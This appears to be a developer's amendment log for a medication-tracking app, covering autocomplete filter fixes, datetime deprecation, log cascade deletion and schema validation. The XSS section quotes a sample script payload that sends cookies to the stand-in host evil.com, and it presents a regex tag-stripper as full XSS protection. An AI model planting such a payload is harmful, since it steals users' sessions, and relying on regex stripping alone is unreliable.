# MedTracker — Amendment Log
**Date:** 2026-03-11
**Session:** Autocomplete fixes + T-001, T-007, T-008, T-006

---

## Overview

Six targeted fixes applied in one session. No new files created. No API endpoints added or removed. All changes are backwards-compatible — no database migration required.

---

## Fix 1 — Autocomplete: Turn off debug printing

**File:** `backend/medication_knowledge.py`
**Line:** 49

### What changed
```python
# Before
self.debug = True

# After
self.debug = False
```

### Why
The `debug` flag is wired to `print()` calls throughout `MedicationKnowledgeBase`. With it on, every single keystroke in the autocomplete field triggered stdout output — cache hit/miss messages, raw API response dumps, RxNorm result counts. This was left on from development.

It wasn't crashing anything, but it meant:
- Every keypress produced unnecessary I/O
- Your server logs were flooded with noise
- It made real errors harder to spot in output

This flag should always be `False` in any environment where real users are typing.

---

## Fix 2 — Autocomplete: Overly broad supply filter was killing real medications

**File:** `backend/agents/autocomplete_agent.py`
**Method:** `_is_valid()`

### What changed
```python
# Before
bad_patterns = [
    "contact lens", "bandage", "syringe", "needle", "dressing", "dress,",
    "tape", "gauze", "catheter", "drain", "pack", "wrap",
    ...
]

# After
bad_patterns = [
    "contact lens", "bandage", "syringe", "needle", "dressing", "dress,",
    "gauze", "catheter", "drain", "pad pack", "pack of", "wrap",
    ...
]
```

Two patterns were removed or narrowed:

| Pattern | Problem | Fix |
|---------|---------|-----|
| `"tape"` | Substring of **Tapentadol** (Schedule II opioid pain medication). Any user typing "tape" or searching for Tapentadol/Nucynta got zero results. | Removed entirely |
| `"pack"` | Too broad. Would block any drug name containing "pack". | Narrowed to `"pack of"` and `"pad pack"` — matching the KB's own filter which is more precise |

### Why supplies appear in the first place

The app queries **RxNorm** (`rxnav.nlm.nih.gov`) via its `approximateTerm` endpoint. RxNorm is maintained by the **National Library of Medicine (NLM/NIH)** and is not a "medications only" index. Its scope covers anything dispensed or ordered in a clinical system — prescription drugs, OTC drugs, IV supplies, medical devices, and nutritional products — because hospital pharmacy systems track all of these together.

The filter lists in both `medication_knowledge.py` (`_is_valid_medication`) and `autocomplete_agent.py` (`_is_valid`) exist to strip that clinical noise before showing results to a user who just wants to find their Aspirin. The filters need to be precise — broad substring matches create friendly fire on real drug names.

The app also queries **OpenFDA** (`api.fda.gov/drug/label.json`) for drug label data (indications, side effects, interactions, warnings). OpenFDA is strictly medications/biologics, so the supply contamination only comes from RxNorm's approximate term matching.

---

## Fix 3 — Autocomplete: Double-parsing produced inconsistent results

**File:** `backend/agents/autocomplete_agent.py`
**Method:** `_process_results()`

### What changed
```python
# Before — threw away KB's work and re-parsed from scratch
parsed = self._parse_drug_name(name)
base = parsed["base_name"].lower()

suggestions.append(MedicationSuggestion(
    name=name,
    base_name=parsed["base_name"],
    rxcui=item.get("rxcui", ""),
    strength=parsed.get("strength"),
    form=parsed.get("form"),
    score=item.get("score", 0),
    source="rxnorm"
))

# After — trusts KB's already-parsed fields; only re-parses as fallback
parsed = self._parse_drug_name(name)
base_name = item.get("base_name") or parsed["base_name"]
base = base_name.lower()

suggestions.append(MedicationSuggestion(
    name=name,
    base_name=base_name,
    rxcui=item.get("rxcui", ""),
    strength=item.get("strength") or parsed.get("strength"),
    form=item.get("form") or parsed.get("form"),
    score=item.get("score", 0),
    source="rxnorm"
))
```

### Why
`kb.autocomplete()` already runs its own `_parse_drug_name()` on every result and sets `base_name`, `strength`, and `form` before returning. The `AutocompleteAgent._process_results()` was then throwing all of that away and re-parsing the raw `name` string using a *different* parser with slightly different regex rules.

Two parsers, same data, different rules = inconsistent `base_name` extraction, inconsistent deduplication, and `strength`/`form` values that could differ between what the KB computed and what the agent computed.

The fix: use the KB's values first (`item.get("base_name")`), and only fall back to re-parsing if the KB didn't provide them. The deduplication key (`base`) is now derived from the same `base_name` that gets stored, so the dedup is consistent.

---

## T-001 — Fix `MedicationReminder` undefined class reference

**File:** `backend/agents/medication_agent.py`
**Lines:** 167, 239

### What changed
```python
# Before — NameError at runtime, crashes update and permanent delete
self.db.query(Reminder).filter(
    MedicationReminder.medication_id == medication_id
).delete()

# After — correct class reference
self.db.query(Reminder).filter(
    Reminder.medication_id == medication_id
).delete()
```

### Why
`MedicationReminder` does not exist anywhere in this codebase. The correct model class is `Reminder`, imported at the top of the method via `from backend.models import Medication, Reminder`.

This was a copy-paste error that had been sitting undetected because neither path (updating reminders during `update()`, or deleting reminders during permanent `delete()`) had test coverage. Both paths would raise `NameError: name 'MedicationReminder' is not defined` at runtime the moment a user tried to update a medication's schedule or permanently delete a medication.

**Impact before fix:** Any call to `PUT /medications/{id}` with `reminder_times` in the body, or `DELETE /medications/{id}?permanent=true`, would crash with a 500 error.

---

## T-007 — Replace deprecated `datetime.utcnow()`

**Files:**
- `backend/models.py` — line 121
- `backend/core/metering/token_counter.py` — line 20
- `backend/core/telemetry/logger.py` — line 52
- `backend/agents/base.py` — line 54

### What changed
```python
# Before — deprecated since Python 3.12
datetime.utcnow()
field(default_factory=datetime.utcnow)
Field(default_factory=datetime.utcnow)

# After — correct, timezone-aware
datetime.now(timezone.utc)
field(default_factory=lambda: datetime.now(timezone.utc))
Field(default_factory=lambda: datetime.now(timezone.utc))
```

`timezone` import added where missing:
```python
# token_counter.py
from datetime import datetime, date, timezone

# telemetry/logger.py
from datetime import datetime, timezone

# agents/base.py
from datetime import datetime, timezone
```

### Why
`datetime.utcnow()` was deprecated in Python 3.12 and will be removed in a future version. More importantly, it returns a **naive datetime** — a datetime object with no timezone information attached. This means if you ever compare two datetimes (one naive, one timezone-aware), Python raises a `TypeError`. It also means the timestamps are ambiguous if the server's timezone is ever not UTC.

`datetime.now(timezone.utc)` returns a **timezone-aware datetime** — it carries UTC offset information explicitly. SQLAlchemy, Pydantic, and JSON serializers all handle it correctly, and the timestamps are unambiguous regardless of server configuration.

`backend/models.py` already had `timezone` imported (used by `PushSubscription`), so no import change was needed there.

---

## T-008 — Remove cascade delete from medication logs

**File:** `backend/models.py`
**Line:** 82

### What changed
```python
# Before — deleting a medication destroyed its entire adherence history
logs = relationship("MedicationLog", back_populates="medication", cascade="all, delete-orphan")

# After — logs are preserved when a medication is deleted
logs = relationship("MedicationLog", back_populates="medication")
```

### Why
`cascade="all, delete-orphan"` on the `logs` relationship told SQLAlchemy: when a `Medication` row is deleted, automatically delete every `MedicationLog` row associated with it. This is catastrophically wrong for an adherence tracking system.

`MedicationLog` is your **audit trail** — it records every dose taken or missed, with timestamps. That data has medical and legal significance. If a user deletes a medication from their list (because they finished the course, or switched drugs), all proof that they ever took it vanishes with it.

The `reminders` relationship correctly keeps `cascade="all, delete-orphan"` — reminder schedule rows have no independent value without the medication and should be cleaned up. Logs are the opposite: they outlive the medication and should be preserved.

The soft-delete pattern (`is_active = False`) already exists on the `Medication` model. The correct workflow is to archive rather than hard-delete, which the `MedicationAgent.archive()` method already does.

---

## T-006 — Add `max_length` constraints and HTML sanitization to schemas

**File:** `backend/schemas.py`

### What changed

**Added `max_length` to all unconstrained string fields in `MedicationBase`:**

| Field | Max Length | Reason |
|-------|-----------|--------|
| `rxcui` | 20 | RxNorm IDs are short numeric strings |
| `form_type` | 50 | Enum-like field, values are short |
| `strength_unit` | 20 | "mg", "mcg", "ml", "IU", etc. |
| `method_of_intake` | 50 | Enum-like field |
| `dosage` | 200 | Free text but bounded |
| `quantity_unit` | 50 | "tablet(s)", "ml", "puffs" |
| `when_to_take` | 50 | Enum-like field |
| `frequency` | 100 | "Once daily", "Twice daily", etc. |
| `notes` | 1000 | Free text — longest reasonable note |
| `taken_for` | 200 | Condition name |
| `pill_shape` | 20 | "oval", "round", "capsule", etc. |
| `pill_color` | 20 | "white", "blue", "pink", etc. |
| `pill_size` | 20 | "small", "medium", "large" |

**Added `LogCreate.notes` and `LogCreate.taken_for` max_length:**

| Field | Max Length |
|-------|-----------|
| `notes` | 500 |
| `taken_for` | 200 |

**Added HTML-strip validator to `notes` and `taken_for` in both `MedicationBase` and `LogCreate`:**

```python
@field_validator('notes', 'taken_for', mode='before')
@classmethod
def strip_html(cls, v):
    """Strip HTML tags from free-text fields to prevent XSS."""
    if v is None:
        return v
    return re.sub(r'<[^>]+>', '', str(v)).strip()
```

### Why

**`max_length` constraints** are the first line of defence against garbage data and storage abuse. Without them, a caller can POST a `notes` field containing 50 MB of text, which SQLite will happily store. Pydantic enforces these limits at the schema layer — the bad data never reaches the database.

In healthcare applications specifically, unbounded string fields also create risk around data quality. A medication record with a 10,000-character `dosage` field is clearly invalid and should be rejected at the door.

**HTML sanitization** on `notes` and `taken_for` prevents **stored XSS (Cross-Site Scripting)**. If a malicious user submits a `notes` value like:

```
<script>document.location='https://evil.com/?c='+document.cookie</script>
```

...and that value is later rendered in the frontend without escaping, every user who views that medication card runs the attacker's script. The `strip_html` validator removes all HTML tags before the value is stored, so the injection never reaches the database. The regex `<[^>]+>` matches any HTML tag and strips it, leaving only the plain text content.

`re` is part of Python's standard library — no new dependency added.

---

---

## Fix 7 — RxNorm score returned as string causes silent crash in `autocomplete()`

**File:** `backend/medication_knowledge.py`
**Method:** `get_approximate_matches()`
**Line:** 447

### What changed
```python
# Before — stores score as whatever RxNorm sends (a string)
results.append({
    'name': name,
    'rxcui': rxcui,
    'score': candidate.get('score', 0)
})

# After — explicitly cast to float at the source
results.append({
    'name': name,
    'rxcui': rxcui,
    'score': float(candidate.get('score', 0))
})
```

### Why

RxNorm's `approximateTerm` API returns score values as **strings**, not numbers:

```json
{
  "rxcui": "2731475",
  "score": "14.46580696105957",
  "name": "Myqorzo"
}
```

In `kb.autocomplete()`, each result's score is combined with a local relevance score to produce a final sort key:

```python
score = self._score_medication(name)   # returns int
results.append({
    ...
    'sort_score': score + item.get('score', 0)   # int + str → TypeError
})
```

`_score_medication()` returns an `int`. `item.get('score', 0)` returns the string `"14.465..."`. In Python, `int + str` raises:

```
TypeError: unsupported operand type(s) for +: 'int' and 'str'
```

The entire `autocomplete()` method is wrapped in a `try/except` that catches this silently and returns `[]`. This means **`kb.autocomplete()` has always been returning an empty list for every query** — a total silent failure.

### Why this wasn't noticed sooner

The `AutocompleteAgent` has a hardcoded `_common_drugs` fallback list (Aspirin, Tylenol, Lisinopril, Metformin, etc.). When `kb.autocomplete()` returned `[]`, the agent fell back to that list and the autocomplete appeared to work for common medications. Any drug not in the hardcoded list — including newer medications like Myqorzo (aficamten, FDA approved June 2024) — returned nothing.

This also explains why the autocomplete felt "finnicky": it was never actually using RxNorm's real-time results for the primary suggestions. The entire RxNorm pipeline was dead on arrival.

### Secondary effect fixed by this change

`get_approximate_matches()` also sorts by score before returning:

```python
results.sort(key=lambda x: x.get('score', 0), reverse=True)
```

With string scores, this sort is **lexicographic** not numeric. `"9.5"` sorts higher than `"14.2"` because `"9" > "1"` as characters. The highest-scored RxNorm match was not necessarily appearing first. Casting to `float` fixes the sort order as well.

### How it was found

The `/debug/autocomplete/myqorzo` endpoint returned:
```json
{
  "raw_count": 4,
  "filtered_count": 0,
  "filtered_results": []
}
```

RxNorm was returning 4 results (`raw_count: 4`) but zero were making it through to `filtered_results`. Since none of the keyword filters in `_is_valid_medication()` matched "Myqorzo", the only remaining explanation was an exception inside `autocomplete()` being swallowed by the `try/except`. Tracing the code revealed the `int + str` TypeError at the `sort_score` line.

---

## Files Changed Summary

| File | Change |
|------|--------|
| `backend/medication_knowledge.py` | `debug = False`; cast RxNorm score to `float` in `get_approximate_matches()` |
| `backend/agents/autocomplete_agent.py` | Fixed bad filter patterns; trust KB's parsed fields in `_process_results()` |
| `backend/agents/medication_agent.py` | Fixed `MedicationReminder` → `Reminder` (T-001) |
| `backend/models.py` | `datetime.utcnow` → `datetime.now(timezone.utc)`; removed cascade delete on logs (T-007, T-008) |
| `backend/core/metering/token_counter.py` | `datetime.utcnow` → `datetime.now(timezone.utc)`; added `timezone` import (T-007) |
| `backend/core/telemetry/logger.py` | `datetime.utcnow()` → `datetime.now(timezone.utc)`; added `timezone` import (T-007) |
| `backend/agents/base.py` | `datetime.utcnow` → `datetime.now(timezone.utc)`; added `timezone` import (T-007) |
| `backend/schemas.py` | `max_length` on all string fields; HTML-strip validators on `notes` and `taken_for` (T-006) |

**No new files. No new endpoints. No migration required.**
